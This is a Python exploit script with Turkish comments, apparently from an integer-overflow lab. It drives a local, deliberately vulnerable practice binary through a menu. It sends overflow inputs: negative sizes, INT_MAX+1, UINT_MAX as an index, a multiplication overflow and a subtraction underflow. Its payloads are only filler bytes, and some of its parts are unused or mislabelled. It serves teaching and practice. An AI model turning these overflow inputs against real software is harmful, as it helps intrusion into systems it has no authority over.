#!/usr/bin/env python3
# exploit.py - Integer Overflow Exploitation Script

import struct
import subprocess
import sys
import time

# Detect architecture for binary path
import platform
arch = platform.machine()
VICTIM_PROGRAM = f"./compiled/{arch}/vulnerable_code"

# --- GDB ILE BU ADRESI KENDI SISTEMINIZDE BULUN (DEBUG SEMBOLLERI OLMADAN) ---
# Örneğin: 0x401146
# GDB komutları: info functions win_function, disassemble win_function
HEDEF_ADRES = 0x401146  # <-- BU SATIRI GDB'DEN ALDIĞINIZ ADRES ILE GÜNCELLEYİN

def exploit_buffer_size_overflow():
    """
    Zafiyet 1: Buffer boyutu hesaplama hatası
    Negatif değer girerek unsigned cast ile büyük pozitif sayı elde etme
    """
    print("\n=== [SALDIRGAN] Buffer Boyutu Hesaplama Hatası Exploit ===")
    print("[*] Hedef: Negatif değer girerek unsigned cast ile overflow")
    
    try:
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Exploit payload: 1 (seçim) + -1 (negatif boyut) + shellcode
        payload = "1\n-1\n" + "A" * 200 + "\n"
        
        print(f"[*] Payload gönderiliyor: {len(payload)} byte")
        stdout, stderr = p.communicate(input=payload, timeout=5)
        
        print("\n--- Kurban Programdan Gelen Çıktı ---")
        print(stdout)
        print("------------------------------------")
        
        if "Güvenlik kontrolü atlanıyor" in stdout:
            print("[+] Başarılı! Integer overflow zafiyeti istismar edildi!")
        else:
            print("[-] Başarısız. Zafiyet istismar edilemedi.")
            
    except subprocess.TimeoutExpired:
        print("[!] Program timeout oldu - muhtemelen crash oldu")
        p.kill()
    except Exception as e:
        print(f"[!] Hata: {e}")

def exploit_arithmetic_overflow():
    """
    Zafiyet 2: Aritmetik overflow (toplama)
    İki büyük pozitif sayının toplamını negatif yapma
    """
    print("\n=== [SALDIRGAN] Aritmetik Overflow Exploit ===")
    print("[*] Hedef: İki büyük sayının toplamını negatif yapma")
    
    try:
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Exploit payload: 2 (seçim) + 2147483647 (INT_MAX) + 1 (overflow)
        payload = "2\n2147483647\n1\n" + "A" * 100 + "\n" + "B" * 100 + "\n"
        
        print(f"[*] Payload gönderiliyor: INT_MAX + 1 = overflow")
        stdout, stderr = p.communicate(input=payload, timeout=5)
        
        print("\n--- Kurban Programdan Gelen Çıktı ---")
        print(stdout)
        print("------------------------------------")
        
        if "Toplam uzunluk negatif" in stdout:
            print("[+] Başarılı! Aritmetik overflow zafiyeti istismar edildi!")
        else:
            print("[-] Başarısız. Zafiyet istismar edilemedi.")
            
    except subprocess.TimeoutExpired:
        print("[!] Program timeout oldu - muhtemelen crash oldu")
        p.kill()
    except Exception as e:
        print(f"[!] Hata: {e}")

def exploit_array_bounds_bypass():
    """
    Zafiyet 3: Array bounds bypass
    Büyük pozitif sayı girerek negatif indeks elde etme
    """
    print("\n=== [SALDIRGAN] Array Bounds Bypass Exploit ===")
    print("[*] Hedef: Büyük sayı girerek negatif indeks elde etme")
    
    try:
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Exploit payload: 3 (seçim) + 4294967295 (UINT_MAX, -1 olarak yorumlanır)
        payload = "3\n4294967295\n0x41414141\n"
        
        print(f"[*] Payload gönderiliyor: UINT_MAX = -1 (signed)")
        stdout, stderr = p.communicate(input=payload, timeout=5)
        
        print("\n--- Kurban Programdan Gelen Çıktı ---")
        print(stdout)
        print("------------------------------------")
        
        if "Negatif indeks" in stdout:
            print("[+] Başarılı! Array bounds bypass zafiyeti istismar edildi!")
        else:
            print("[-] Başarısız. Zafiyet istismar edilemedi.")
            
    except subprocess.TimeoutExpired:
        print("[!] Program timeout oldu - muhtemelen crash oldu")
        p.kill()
    except Exception as e:
        print(f"[!] Hata: {e}")

def exploit_multiplication_overflow():
    """
    Zafiyet 4: Multiplication overflow
    İki büyük sayının çarpımını negatif yapma
    """
    print("\n=== [SALDIRGAN] Multiplication Overflow Exploit ===")
    print("[*] Hedef: İki büyük sayının çarpımını negatif yapma")
    
    try:
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Exploit payload: 4 (seçim) + 65537 (2^16+1) + 65537 (overflow)
        payload = "4\n65537\n65537\n" + "A" * 1000 + "\n"
        
        print(f"[*] Payload gönderiliyor: 65537 * 65537 = overflow")
        stdout, stderr = p.communicate(input=payload, timeout=5)
        
        print("\n--- Kurban Programdan Gelen Çıktı ---")
        print(stdout)
        print("------------------------------------")
        
        if "Çarpım sonucu negatif" in stdout:
            print("[+] Başarılı! Multiplication overflow zafiyeti istismar edildi!")
        else:
            print("[-] Başarısız. Zafiyet istismar edilemedi.")
            
    except subprocess.TimeoutExpired:
        print("[!] Program timeout oldu - muhtemelen crash oldu")
        p.kill()
    except Exception as e:
        print(f"[!] Hata: {e}")

def exploit_subtraction_underflow():
    """
    Zafiyet 5: Subtraction underflow
    end < start yaparak negatif uzunluk elde etme
    """
    print("\n=== [SALDIRGAN] Subtraction Underflow Exploit ===")
    print("[*] Hedef: end < start yaparak negatif uzunluk elde etme")
    
    try:
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Exploit payload: 5 (seçim) + 10 (start) + 5 (end < start)
        payload = "5\n10\n5\n" + "A" * 100 + "\n"
        
        print(f"[*] Payload gönderiliyor: start=10, end=5 (underflow)")
        stdout, stderr = p.communicate(input=payload, timeout=5)
        
        print("\n--- Kurban Programdan Gelen Çıktı ---")
        print(stdout)
        print("------------------------------------")
        
        if "Negatif uzunluk" in stdout:
            print("[+] Başarılı! Subtraction underflow zafiyeti istismar edildi!")
        else:
            print("[-] Başarısız. Zafiyet istismar edilemedi.")
            
    except subprocess.TimeoutExpired:
        print("[!] Program timeout oldu - muhtemelen crash oldu")
        p.kill()
    except Exception as e:
        print(f"[!] Hata: {e}")

def exploit_win_function():
    """
    Bonus: win_function'ı çağırma (eğer mümkünse)
    """
    print("\n=== [SALDIRGAN] Win Function Exploit ===")
    print("[*] Hedef: win_function'ı çağırarak flag almak")
    
    try:
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Bu exploit sadece demonstrasyon amaçlı
        # Gerçekte win_function'a erişim için daha karmaşık teknikler gerekir
        payload = "6\n"  # Çıkış seçeneği
        
        print(f"[*] Payload gönderiliyor: Çıkış")
        stdout, stderr = p.communicate(input=payload, timeout=5)
        
        print("\n--- Kurban Programdan Gelen Çıktı ---")
        print(stdout)
        print("------------------------------------")
        
        if "Çıkış yapılıyor" in stdout:
            print("[+] Program başarıyla sonlandırıldı")
        else:
            print("[-] Program beklenmedik şekilde sonlandı")
            
    except subprocess.TimeoutExpired:
        print("[!] Program timeout oldu")
        p.kill()
    except Exception as e:
        print(f"[!] Hata: {e}")

def show_menu():
    print("\n=== Integer Overflow Exploit Menu ===")
    print("1. Buffer boyutu hesaplama hatası")
    print("2. Aritmetik overflow (toplama)")
    print("3. Array bounds bypass")
    print("4. Multiplication overflow")
    print("5. Subtraction underflow")
    print("6. Win function (bonus)")
    print("7. Tüm exploitleri çalıştır")
    print("8. Çıkış")
    print("Seçiminizi yapın (1-8): ")

def run_all_exploits():
    """Tüm exploitleri sırayla çalıştır"""
    print("\n=== [SALDIRGAN] Tüm Integer Overflow Exploitleri Başlatıldı ===")
    
    exploits = [
        exploit_buffer_size_overflow,
        exploit_arithmetic_overflow,
        exploit_array_bounds_bypass,
        exploit_multiplication_overflow,
        exploit_subtraction_underflow,
        exploit_win_function
    ]
    
    for i, exploit in enumerate(exploits, 1):
        print(f"\n--- Exploit {i}/{len(exploits)} ---")
        exploit()
        time.sleep(1)  # Kısa bekleme

def main():
    """Ana exploit fonksiyonu"""
    print("--- [SALDIRGAN] Integer Overflow Exploit Başlatıldı ---")
    print("--- [NOT] Binary debug sembolleri olmadan derlenmiştir ---")
    
    if HEDEF_ADRES == 0x401146 and "guncelleyin" in "GUNCELLEYIN":
        print("\n[!] UYARI: HEDEF_ADRES'i kendi sisteminizdeki adresle güncellemeyi unutmayın!")
        print("[!] GDB komutları: info functions win_function, disassemble win_function\n")

    print(f"[*] Hedef Program: {VICTIM_PROGRAM}")
    print(f"[*] Hedef Adres: {hex(HEDEF_ADRES)}")
    
    while True:
        show_menu()
        try:
            choice = int(input().strip())
            
            if choice == 1:
                exploit_buffer_size_overflow()
            elif choice == 2:
                exploit_arithmetic_overflow()
            elif choice == 3:
                exploit_array_bounds_bypass()
            elif choice == 4:
                exploit_multiplication_overflow()
            elif choice == 5:
                exploit_subtraction_underflow()
            elif choice == 6:
                exploit_win_function()
            elif choice == 7:
                run_all_exploits()
            elif choice == 8:
                print("Çıkış yapılıyor...")
                break
            else:
                print("Geçersiz seçim!")
                
        except ValueError:
            print("Geçersiz giriş! Lütfen sayı girin.")
        except KeyboardInterrupt:
            print("\n\nÇıkış yapılıyor...")
            break
        except Exception as e:
            print(f"Beklenmeyen hata: {e}")

if __name__ == "__main__":
    main()
